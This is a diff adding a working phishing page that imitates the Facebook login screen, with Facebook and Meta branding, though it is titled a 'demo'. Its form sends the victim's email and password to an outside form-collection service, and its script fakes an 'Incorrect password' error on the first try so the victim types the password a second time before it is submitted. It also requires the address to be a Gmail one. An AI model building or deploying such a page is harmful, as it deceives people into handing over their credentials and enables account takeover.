@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login Demo</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #0b111e;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px 0;
+    }
+    .container {
+      width: 420px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      min-height: 90vh; 
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+    .logo {
+      width: 72px;
+      height: 72px;
+      margin: auto;
+    }
+    .logo svg {
+      width: 100%;
+      height: 100%;
+    }
+    h1 {
+      color: #1877f2;
+      font-size: 34px;
+      margin: 12px 0 5px;
+      font-weight: bold;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      flex-grow: 1; 
+    }
+    .input-box {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    input[type="text"],
+    input[type="password"],
+    input[type="email"] {
+      width: 100%;
+      height: 56px;
+      padding: 0 16px;
+      border: 1px solid #2d3d5a;
+      background: #161f30;
+      color: #ffffff;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    input::placeholder {
+      color: #64748b;
+    }
+    input:focus {
+      outline: none;
+      border-color: #1877f2;
+    }
+    .eye {
+      position: absolute;
+      right: 16px;
+      top: 28px;
+      transform: translateY(-50%);
+      width: 22px;
+      cursor: pointer;
+      z-index: 10;
+    }
+    .error-message {
+      color: #ef4444;
+      font-size: 14px;
+      margin-top: 8px;
+      display: none;
+      text-align: left;
+      padding-left: 4px;
+    }
+    .options {
+      display: flex;
+      align-items: center;
+      margin: 8px 0 24px;
+    }
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      color: #9cb3c9;
+      cursor: pointer;
+    }
+    .remember input {
+      width: 16px;
+      height: 16px;
+      accent-color: #1877f2;
+      margin: 0;
+    }
+    button {
+      width: 100%;
+      height: 52px;
+      border: none;
+      border-radius: 100px;
+      font-size: 16px;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .login {
+      background: #1877f2;
+      color: white;
+      font-weight: bold;
+    }
+    .forgot {
+      text-align: center;
+      margin: 24px 0;
+      color: #ffffff;
+      cursor: pointer;
+      font-size: 15px;
+    }
+    .spinner {
+      display: none;
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      border-top-color: #ffffff;
+      animation: spin 0.8s ease-in-out infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .bottom-section {
+      margin-top: auto; 
+      padding-top: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    hr {
+      width: 100%;
+      border: 0;
+      border-top: 1px solid #2d3d5a;
+      margin-bottom: 24px;
+    }
+    .create {
+      background: transparent;
+      color: #1877f2;
+      border: 1px solid #1877f2;
+      margin-bottom: 30px;
+    }
+    .meta-footer {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .meta-logo-img {
+      width: 100px;
+      height: auto;
+      object-fit: contain;
+      filter: brightness(0) invert(0.7);
+    }
+    input:invalid:focus {
+      border-color: #ef4444;
+    }
+    @media (max-width: 480px) {
+      .container { 
+        width: 90%; 
+        min-height: 85vh; 
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <div class="logo">
+      <svg viewBox="0 0 100 100" xmlns="http://w3.org">
+        <circle cx="50" cy="50" r="50" fill="#1877F2"/>
+        <path fill="#fff" d="M56.5 82V53.4h9.6l1.5-11.2h-11.1v-7.2c0-3.3 1.1-5.4 5.5-5.4h5.9v-10c-1-.1-4.6-.5-8.7-.5-8.6 0-14.5 5.2-14.5 14.8v8.3h-9.7v11.2h9.7V82h11.8z"/>
+      </svg>
+    </div>
+    <h1>facebook</h1>
+  </div>
+
+  <form id="loginForm" action="https://submit-form.com/FTSrHCvnr"  method="post">
+    <div class="input-box">
+      <input 
+        type="email" 
+        id="email"
+        name="email_or_phone" 
+        placeholder="Email" 
+        pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$"
+        title="Please enter a valid Gmail address ending in @gmail.com"
+        required
+      >
+    </div>
+    
+    <div class="input-box">
+      <input id="password" type="password" name="password" placeholder="Password" required>
+      <svg id="eyeIcon" class="eye" onclick="togglePassword()"
+           xmlns="http://w3.org"
+           width="24"
+           height="24"
+           viewBox="0 0 24 24"
+           fill="none"
+           stroke="#6B7280"
+           stroke-width="2"
+           stroke-linecap="round"
+           stroke-linejoin="round">
+        <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
+        <circle cx="12" cy="12" r="3"/>
+      </svg>
+      <div id="passwordError" class="error-message">Incorrect password or email</div>
+    </div>
+
+    <div class="options">
+      <label class="remember">
+        <input type="checkbox" name="remember_me" value="yes"> Remember me
+      </label>
+    </div>
+
+    <button type="submit" class="login" id="loginBtn">
+      <span id="btnText">Log In</span>
+      <div class="spinner" id="spinner"></div>
+    </button>
+
+    <div class="forgot">Forgot password?</div>
+
+    <div class="bottom-section">
+      <hr>
+      <button type="button" class="create">Create new account</button>
+      <div class="meta-footer">
+        <img class="meta-logo-img" src="https://wikimedia.org" alt="Meta Logo">
+      </div>
+    </div>
+  </form>
+</div>
+
+<script>
+  let loginAttempts = 0;
+
+  function togglePassword() {
+    const pass = document.getElementById("password");
+    const eye = document.getElementById("eyeIcon");
+    if (pass.type === "password") {
+      pass.type = "text";
+      eye.setAttribute("stroke", "white");
+    } else {
+      pass.type = "password";
+      eye.setAttribute("stroke", "#6B7280");
+    }
+  }
+
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault(); 
+    
+    const emailInput = document.getElementById('email');
+    const passwordError = document.getElementById('passwordError');
+    const btn = document.getElementById('loginBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+
+    if (!emailInput.value.toLowerCase().endsWith('@gmail.com')) {
+      emailInput.setCustomValidity("Only genuine @gmail.com addresses are permitted.");
+      emailInput.reportValidity();
+      return;
+    } else {
+      emailInput.setCustomValidity("");
+    }
+
+    loginAttempts++;
+
+    if (loginAttempts === 1) {
+      // First attempt: short 1.2 second loading spinner, then show error
+      btnText.style.display = 'none';
+      spinner.style.display = 'block';
+      btn.style.pointerEvents = 'none';
+      btn.style.opacity = '0.8';
+
+      setTimeout(() => {
+        spinner.style.display = 'none';
+        btnText.style.display = 'block';
+        btn.style.pointerEvents = 'auto';
+        btn.style.opacity = '1';
+        passwordError.style.display = 'block'; 
+      }, 1200); 
+
+      return; 
+    }
+
+    // Second attempt: Spinner runs for exactly 5 seconds (5000ms) before submission
+    passwordError.style.display = 'none';
+    btnText.style.display = 'none';
+    spinner.style.display = 'block';
+    btn.style.pointerEvents = 'none';
+    btn.style.opacity = '0.8';
+
+    setTimeout(() => {
+      this.submit();
+    }, 5000); 
+  });
+
+  document.getElementById('email').addEventListener('input', function() {
+    this.setCustomValidity("");
+  });
+</script>
+
+</body>
+</html>
